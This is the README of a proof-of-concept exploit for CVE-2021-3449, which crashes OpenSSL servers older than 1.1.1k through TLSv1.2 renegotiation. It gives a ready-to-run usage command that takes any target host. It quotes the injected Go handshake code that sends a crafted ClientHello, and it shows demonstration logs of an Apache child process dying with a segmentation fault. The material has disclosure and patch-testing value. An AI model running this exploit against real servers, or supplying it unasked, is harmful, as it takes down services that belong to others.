# CVE-2021-3449 PoC exploit

Usage: `go run . -host hostname:port`

This program implements a proof-of-concept exploit of CVE-2021-3449
affecting OpenSSL servers pre-1.1.1k if TLSv1.2 secure renegotiation is accepted.

It connects to a TLSv1.2 server and immediately initiates an RFC 5746 "secure renegotiation".
The attack involves a maliciously-crafted `ClientHello` that causes the server to crash
by causing a NULL pointer dereference (Denial-of-Service).

## Implementation

`main.go` is a tiny script that connects to a TLS server, forces a renegotiation, and disconnects.

The exploit code was injected into a bundled version of the Go 1.14.15 `encoding/tls` package.
You can find it in `handshake_client.go:115`. The logic is self-explanatory.

```go
// CVE-2021-3449 exploit code.
if hello.vers >= VersionTLS12 {
    if c.handshakes == 0 {
        println("initial handshake")
        hello.supportedSignatureAlgorithms = supportedSignatureAlgorithms
    } else {
        // OpenSSL pre-1.1.1k runs into a NULL-pointer dereference
        // if the supported_signature_algorithms extension is omitted,
        // but supported_signature_algorithms_cert is present.
        println("malicious handshake")
        hello.supportedSignatureAlgorithmsCert = supportedSignatureAlgorithms
    }
}
```

– terorie


This repository bundles the `encoding/tls` package of the Go programming language.

```
// Copyright 2009 The Go Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.
```

## Demonstration

    $ vagrant up --provision
    ...
    default: go version go1.16.2 linux/amd64
    default: initial handshake
    default: connected
    default: malicious handshake
    default: handshake failed. exploit might have been successful
    default: panic: handshake failed: EOF
    default:
    default: goroutine 1 [running]:
    default: main.main()
    default: 	/vagrant/main.go:25 +0x337
    default: exit status 2
    default:
    default: [Fri Mar 26 16:56:35.630712 2021] [ssl:info] [pid 731:tid 140507287992064] [client 127.0.0.1:33816] AH01964: Connection to child 66 established (server localhost:443)
    default: [Fri Mar 26 16:56:35.631233 2021] [ssl:debug] [pid 731:tid 140507287992064] ssl_engine_kernel.c(2374): [client 127.0.0.1:33816] AH02645: Server name not provided via TLS extension (using default/first virtual host)
    default: [Fri Mar 26 16:56:35.632903 2021] [ssl:debug] [pid 731:tid 140507287992064] ssl_engine_kernel.c(2235): [client 127.0.0.1:33816] AH02041: Protocol: TLSv1.2, Cipher: ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits)
    default: [Fri Mar 26 16:56:35.633110 2021] [ssl:error] [pid 731:tid 140507287992064] [client 127.0.0.1:33816] AH02042: rejecting client initiated renegotiation
    default: [Fri Mar 26 16:56:35.633180 2021] [ssl:debug] [pid 731:tid 140507287992064] ssl_engine_kernel.c(2374): [client 127.0.0.1:33816] AH02645: Server name not provided via TLS extension (using default/first virtual host)
    default: [Fri Mar 26 16:56:35.728225 2021] [core:notice] [pid 728:tid 140507322004608] AH00052: child pid 731 exit signal Segmentation fault (11)
